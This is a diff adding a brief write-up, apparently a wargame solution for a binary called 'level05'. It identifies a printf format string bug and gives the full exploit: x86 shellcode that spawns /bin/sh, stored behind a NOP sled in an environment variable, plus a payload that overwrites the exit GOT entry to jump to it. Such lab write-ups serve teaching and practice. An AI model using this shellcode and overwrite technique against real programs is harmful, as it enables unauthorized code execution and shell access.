@@ -1,0 +1,9 @@
+We can see that the program take our input and store it into a buffer to print it with printf.
+So it's vulnerable to format string exploit.
+We can overwrite the the address of the exit got with the address of our shellcode store in an environement variable.
+
+$> export SHELLCODE=$(python -c 'print "\x90" * 200 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
+
+$> python -c 'print "\xe0\x97\x04\x08\xe2\x97\04\x08%55450x%10$hn%10077x%11$hn"' > /tmp/exploit
+
+$> cat /tmp/exploit - | ./level05
